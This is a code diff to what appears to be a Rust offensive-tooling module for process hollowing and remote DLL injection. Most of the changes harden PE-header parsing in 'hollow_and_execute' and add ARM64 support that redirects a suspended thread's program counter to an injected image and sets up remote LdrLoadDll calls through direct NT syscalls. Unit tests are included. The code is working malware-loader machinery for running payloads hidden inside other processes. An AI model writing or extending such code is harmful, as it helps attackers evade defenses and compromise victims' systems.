@@ -50,6 +50,39 @@ fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
     rva
 }
 
+#[cfg(any(windows, test))]
+fn checked_payload_range(
+    payload_len: usize,
+    offset: usize,
+    size: usize,
+    what: &str,
+) -> Result<std::ops::Range<usize>> {
+    let end = offset
+        .checked_add(size)
+        .ok_or_else(|| anyhow!("hollow_and_execute: {what} offset range overflow"))?;
+    if end > payload_len {
+        return Err(anyhow!(
+            "hollow_and_execute: PE too small for {what} (offset {offset:#x}, size {size:#x}, payload {} bytes)",
+            payload_len
+        ));
+    }
+    Ok(offset..end)
+}
+
+#[cfg(any(windows, test))]
+fn checked_pe_lfanew(payload: &[u8]) -> Result<usize> {
+    checked_payload_range(payload.len(), 0x3c, 4, "DOS e_lfanew")?;
+    let raw = i32::from_le_bytes(payload[0x3c..0x40].try_into().unwrap());
+    if raw < 0 {
+        return Err(anyhow!(
+            "hollow_and_execute: invalid negative e_lfanew ({raw})"
+        ));
+    }
+    let offset = raw as usize;
+    checked_payload_range(payload.len(), offset, 4, "NT signature")?;
+    Ok(offset)
+}
+
 /// Convert a Relative Virtual Address (RVA) from the PE optional-header data
 /// directories to a raw file offset by walking the section table.
 ///
@@ -778,19 +811,13 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     }
 
     let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
-    let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
+    let e_lfanew = checked_pe_lfanew(payload)?;
     let nt_sig_off = e_lfanew;
     let opt_magic_off = e_lfanew
-        .saturating_add(4)
-        .saturating_add(std::mem::size_of::<IMAGE_FILE_HEADER>());
-    if opt_magic_off + 2 > payload.len() {
-        return Err(anyhow!(
-            "hollow_and_execute: PE too small for OptionalHeader.Magic"
-        ));
-    }
-    if nt_sig_off + 4 > payload.len() {
-        return Err(anyhow!("hollow_and_execute: PE too small for NT signature"));
-    }
+        .checked_add(4)
+        .and_then(|offset| offset.checked_add(std::mem::size_of::<IMAGE_FILE_HEADER>()))
+        .ok_or_else(|| anyhow!("hollow_and_execute: OptionalHeader.Magic offset overflow"))?;
+    checked_payload_range(payload.len(), opt_magic_off, 2, "OptionalHeader.Magic")?;
     let nt_sig = u32::from_le_bytes(payload[nt_sig_off..nt_sig_off + 4].try_into().unwrap());
     if nt_sig != IMAGE_NT_SIGNATURE {
         return Err(anyhow!("hollow_and_execute: invalid NT signature"));
@@ -804,9 +831,12 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         return unsafe { hollow_and_execute_pe32(payload) };
     }
 
-    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
-        return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
-    }
+    checked_payload_range(
+        payload.len(),
+        e_lfanew,
+        std::mem::size_of::<IMAGE_NT_HEADERS64>(),
+        "NT headers",
+    )?;
     let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
     unsafe {
         if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
@@ -1275,7 +1305,15 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         );
         match get_ctx_status {
             Ok(s) if s >= 0 => {
-                ctx.Rip = (remote_base + entry_point_rva) as u64;
+                let entry_point = (remote_base + entry_point_rva) as u64;
+                #[cfg(target_arch = "x86_64")]
+                {
+                    ctx.Rip = entry_point;
+                }
+                #[cfg(target_arch = "aarch64")]
+                {
+                    ctx.Pc = entry_point;
+                }
                 let set_ctx_status = nt_syscall::syscall!(
                     "NtSetContextThread",
                     h_thread as u64,
@@ -1368,12 +1406,13 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
         return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
     }
-    let e_lfanew = (*dos).e_lfanew as usize;
-    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS32>() > payload.len() {
-        return Err(anyhow!(
-            "hollow_and_execute: PE32 payload too small for NT headers"
-        ));
-    }
+    let e_lfanew = checked_pe_lfanew(payload)?;
+    checked_payload_range(
+        payload.len(),
+        e_lfanew,
+        std::mem::size_of::<IMAGE_NT_HEADERS32>(),
+        "PE32 NT headers",
+    )?;
 
     let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
     if (*nt).Signature != IMAGE_NT_SIGNATURE {
@@ -2784,14 +2823,49 @@ unsafe fn fix_iat_remote(
                                         }
                                     }
 
-                                    #[cfg(not(target_arch = "x86_64"))]
+                                    #[cfg(target_arch = "aarch64")]
                                     {
-                                        tracing::error!(
-                                            "fix_iat_remote: remote LdrLoadDll argument setup is unsupported on this architecture"
-                                        );
-                                        remote_load_failure = Some(
-                                            "remote LdrLoadDll argument setup unsupported on this architecture".to_string(),
-                                        );
+                                        let mut ctx: CONTEXT = std::mem::zeroed();
+                                        ctx.ContextFlags = CONTEXT_FULL;
+                                        let get_ctx = nt_syscall::syscall!(
+                                            "NtGetContextThread",
+                                            h_thread as u64,
+                                            &mut ctx as *mut _ as u64,
+                                        )
+                                        .unwrap_or(-1);
+                                        if get_ctx < 0 {
+                                            tracing::warn!(
+                                                "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
+                                            );
+                                            remote_load_failure = Some(
+                                                "NtGetContextThread failed while preparing remote LdrLoadDll".to_string(),
+                                            );
+                                        } else {
+                                            // Windows ARM64 calling convention passes the first
+                                            // four integer/pointer arguments in X0-X3:
+                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle).
+                                            let regs = ctx.u.s_mut();
+                                            regs.X0 = 0;
+                                            regs.X1 = 0;
+                                            regs.X2 = remote_us_ptr as u64;
+                                            regs.X3 = remote_base_out as u64;
+                                            let set_ctx = nt_syscall::syscall!(
+                                                "NtSetContextThread",
+                                                h_thread as u64,
+                                                &ctx as *const _ as u64,
+                                            )
+                                            .unwrap_or(-1);
+                                            if set_ctx < 0 {
+                                                tracing::warn!(
+                                                    "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
+                                                );
+                                                remote_load_failure = Some(
+                                                    "NtSetContextThread failed while preparing remote LdrLoadDll".to_string(),
+                                                );
+                                            } else {
+                                                ldr_args_configured = true;
+                                            }
+                                        }
                                     }
 
                                     if !ldr_args_configured {
@@ -3047,7 +3121,7 @@ pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
 
 #[cfg(test)]
 mod tests {
-    use super::{rva_to_file_offset_sections, SectionDesc};
+    use super::{checked_pe_lfanew, rva_to_file_offset_sections, SectionDesc};
 
     /// Build a synthetic section table where raw offsets and virtual addresses
     /// deliberately differ so a naive RVA-as-file-offset would be wrong.
@@ -3113,6 +3187,28 @@ mod tests {
         // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
         // so it should fall through to the identity fallback.
         assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
+    }
+
+    #[test]
+    fn checked_pe_lfanew_rejects_negative_offset() {
+        let mut payload = vec![0u8; 0x80];
+        payload[0] = b'M';
+        payload[1] = b'Z';
+        payload[0x3c..0x40].copy_from_slice(&(-4i32).to_le_bytes());
+
+        let err = checked_pe_lfanew(&payload).unwrap_err().to_string();
+        assert!(err.contains("negative e_lfanew"));
+    }
+
+    #[test]
+    fn checked_pe_lfanew_rejects_out_of_bounds_offset() {
+        let mut payload = vec![0u8; 0x80];
+        payload[0] = b'M';
+        payload[1] = b'Z';
+        payload[0x3c..0x40].copy_from_slice(&(0x1000i32).to_le_bytes());
+
+        let err = checked_pe_lfanew(&payload).unwrap_err().to_string();
+        assert!(err.contains("NT signature"));
     }
 
     #[cfg(windows)]
